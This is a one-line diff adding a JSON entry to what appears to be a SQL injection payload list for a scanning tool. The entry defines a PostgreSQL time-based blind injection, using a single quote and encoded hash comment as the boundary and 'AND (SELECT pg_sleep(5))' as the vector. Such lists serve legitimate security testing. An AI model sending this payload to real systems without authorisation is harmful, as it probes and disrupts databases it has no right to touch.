@@ -1,0 +1,1 @@
+{"dbms": "pgsql", "technique": "time", "boundary": {"prefix": "'%23", "suffix": "", "type": "single-enc-hash"}, "vector": "{B} AND (SELECT pg_sleep(5))", "comment": "pgsql time: single+enc hash"}
